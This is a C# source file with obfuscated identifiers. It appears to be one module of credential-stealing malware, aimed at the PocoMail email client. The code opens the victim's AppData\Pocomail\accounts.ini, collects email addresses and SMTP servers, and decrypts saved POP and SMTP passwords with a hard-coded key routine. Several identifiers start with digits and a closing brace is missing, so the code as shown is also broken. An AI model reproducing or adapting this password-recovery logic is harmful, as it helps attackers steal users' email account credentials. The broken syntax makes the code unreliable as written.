using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using C6Zy;
using JSW1fecBOy;
using rCOGWW;

namespace rk937aHHc
{
	public class PocoMail : EtbH
	{
		public PocoMail()
		{
			this.134pO = "PocoMail";
		}

		public string 134pO { get; set; }

	public List<WTitxI2m> Grab()
	{
		List<WTitxI2m> list = new List<WTitxI2m>();
		string accountsPath = Path.Combine(
			Environment.GetEnvironmentVariable("appdata"),
			"Pocomail",
			"accounts.ini"
		);

		if (!File.Exists(accountsPath))
			return list;

		w3uoxlrf accountsIni = new w3uoxlrf(accountsPath);

		foreach (string key in accountsIni.Keys)
		{
			WTitxI2m account = new WTitxI2m();

			foreach (string field in accountsIni[key].Keys)
			{
				string value = accountsIni[key][field];

				if (field == "Email")
				{
					account.data2 = value;
				}
				else if (field == "POPPass" || field == "SMTPPass")
				{
					if (!string.IsNullOrEmpty(value))
						account.data3 = PocoMail.KPU9gUdpOW(value, 0);
				}
				else if (field == "SMTP")
				{
					account.data1 = value;
				}
			}

			account.data4 = this.134pO;
			list.Add(account);
		}

		return list;
	}

	private static string KPU9gUdpOW(string input, int flag)
	{
		try
		{
			byte[] data = g3Vt7T2gk5.83xr(input); 
			byte[] resultBytes = new byte[data.Length];

			int key = (flag == 0) ? 10906 : 9527;

			for (int i = 0; i < data.Length; i++)
			{
				resultBytes[i] = (byte)(data[i] ^ (key >> 8));
				key = ((data[i] + key) * 33089 + 12657) & 0xFFFF; 
			}

			return Encoding.Default.GetString(resultBytes);
		}
		catch
		{
			return "";
		}
	}
}

